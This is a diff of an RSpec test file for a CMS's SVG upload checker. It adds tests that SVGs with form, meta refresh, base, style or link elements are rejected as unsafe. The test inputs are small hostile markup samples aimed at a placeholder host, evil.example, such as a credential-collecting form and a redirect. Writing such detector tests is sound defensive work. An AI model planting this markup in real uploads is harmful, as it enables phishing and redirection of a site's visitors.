@@ -160,4 +160,46 @@ RSpec.describe CamaleonCms::SvgContentChecker do
       expect(described_class.unsafe?(content)).to be(true)
     end
   end
+
+  # These five are valid SVG and none executes script on its own, but an uploaded SVG is served
+  # inline from the site origin. ContentSecurity::BLOCKED_ELEMENTS already refuses all of them in
+  # every non-SVG upload; refusing them here stops the two rulesets disagreeing about the same
+  # bytes, which is what let an accepted .svg be re-uploaded under another extension.
+  describe 'elements that make a served SVG behave like a page' do
+    def svg_wrapping(markup)
+      <<~SVG
+        <?xml version="1.0" encoding="UTF-8"?>
+        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+          #{markup}
+        </svg>
+      SVG
+    end
+
+    it 'rejects a form, which can collect credentials on the site origin' do
+      expect(described_class.unsafe?(svg_wrapping('<form action="https://evil.example"><input name="p"/></form>')))
+        .to be(true)
+    end
+
+    it 'rejects a meta refresh, which can navigate the visitor away' do
+      expect(described_class.unsafe?(svg_wrapping('<meta http-equiv="refresh" content="0;url=https://evil.example"/>')))
+        .to be(true)
+    end
+
+    it 'rejects a base element, which can repoint every relative URL in the document' do
+      expect(described_class.unsafe?(svg_wrapping('<base href="https://evil.example/"/>'))).to be(true)
+    end
+
+    it 'rejects a style element' do
+      expect(described_class.unsafe?(svg_wrapping('<style>rect { fill: red }</style>'))).to be(true)
+    end
+
+    it 'rejects a link element, which can pull in remote styling' do
+      expect(described_class.unsafe?(svg_wrapping('<link rel="stylesheet" href="https://evil.example/x.css"/>')))
+        .to be(true)
+    end
+
+    it 'still accepts a plain shape, so the ban is scoped to those five' do
+      expect(described_class.unsafe?(svg_wrapping('<circle cx="50" cy="50" r="40" fill="red"/>'))).to be(false)
+    end
+  end
 end
